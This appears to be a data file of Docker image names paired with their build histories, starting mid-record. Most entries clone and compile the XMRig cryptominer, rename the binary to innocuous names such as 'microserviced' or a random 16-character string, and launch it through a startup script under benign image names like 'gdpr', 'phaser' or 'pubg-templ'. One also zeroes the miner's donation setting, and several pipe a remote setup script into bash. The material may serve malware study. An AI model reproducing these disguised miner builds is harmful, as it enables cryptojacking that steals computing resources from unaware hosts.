libuv1-dev libssl-dev libhwloc-dev gcc-7 g++-7\'     && sed -i \'s/archive.canonical.com/tw.archive.canonical.com/g\' /etc/apt/sources.list     && sed -i \'s/archive.ubuntu.com/tw.archive.ubuntu.com/g\' /etc/apt/sources.list     && apt-get -qq update     && apt-get -qq install software-properties-common     && add-apt-repository ppa:jonathonf/gcc-7.1 -y     && apt-get -qq update     && apt-get -qq install $buildDeps     && git clone $GIT_REPOSITORY     && mv xmrig stress     && cd ./stress     && git checkout -b $GIT_VERSION     && sed -i \'s/kDefaultDonateLevel = .*/kDefaultDonateLevel = 0;/\' src/donate.h     && sed -i \'s/kMinimumDonateLevel = .*/kMinimumDonateLevel = 0;/\' src/donate.h     && mkdir build     && cd build     && cmake .. ${CMAKE_FLAGS}     && make     && mv xmrig stress\nCOPY file:28595bed9b87531d525ac0fc42ca3f0b5b6080975c429afe8a1ed1e127c50fed /stress/build/\nWORKDIR /stress/build\nENTRYPOINT ["/stress/build/stress"]'
82zge/mmkr; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
siwilus/gdpr; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
tecexokel/phaser; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
lamiki/xteer; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
g1080/quantum; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
tecexokel/photon; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
wegerit/pubg-templ; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone https://socialwrap@bitbucket.org/socialwrap/deadpico.git && cd deadpico && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadpico && cd /deadpico && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadpico\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
lamiki/igtk; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
satamu/quqer; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
lamiki/turbo-cache-qrl; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
satamu/pi-shift; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get install -y git curl build-essential cmake libuv1-dev libmicrohttpd-dev &&     curl -sL https://deb.nodesource.com/setup_10.x | bash - &&     apt-get install -y nodejs &&     git clone -b qrl https://socialwrap@bitbucket.org/socialwrap/deadhash.git && cd deadhash && npm i &&     git clone https://github.com/xmrig/xmrig.git &&     cd xmrig && mkdir build && cd build && cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release .. && make &&     mv xmrig microserviced && cp microserviced /deadhash && cd /deadhash && rm -rf xmrig\nRUN apt-get clean && apt-get purge -y git curl build-essential cmake\nWORKDIR /deadhash\nRUN export NAME=$(cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 16 | head -n 1) &&    cp microserviced $NAME && echo "\\n ./${NAME}" >> electrode.sh\nCMD ["/bin/sh -c npm start"]'
